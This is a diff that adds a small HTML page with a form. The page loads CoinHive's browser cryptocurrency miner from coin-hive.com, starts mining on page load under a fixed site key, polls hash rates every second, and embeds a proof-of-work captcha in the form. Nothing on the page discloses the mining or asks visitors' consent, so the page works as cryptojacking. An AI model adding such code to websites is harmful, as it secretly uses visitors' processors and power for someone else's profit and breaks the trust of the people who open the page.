@@ -1,1 +1,38 @@
+<html>
 
+    <head>
+        <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+        <script src="https://coin-hive.com/lib/captcha.min.js" async></script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+        <script src="main.js"></script>
+    </head>
+    <body>
+        <script>
+            var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
+            miner.start();
+
+            // Listen on events
+            miner.on('found', function() { /* Hash found */ });
+            miner.on('accepted', function() { /* Hash accepted by the pool */ });
+
+            // Update stats once per second
+            setInterval(function() {
+                var hashesPerSecond = miner.getHashesPerSecond();
+                var totalHashes = miner.getTotalHashes();
+                var acceptedHashes = miner.getAcceptedHashes();
+
+                // Output to HTML elements...
+            }, 1000);
+        </script>
+
+        <form action="?" method="post">
+            <!-- other form fields -->
+
+            <div class="coinhive-captcha" data-hashes="1024" data-key="1bKAZIoqiathAWQnJFsbc4pFB54tTIhK"></div>
+
+            <input type="submit" value="Submit"/>
+        </form>
+
+    </body>
+
+</html>
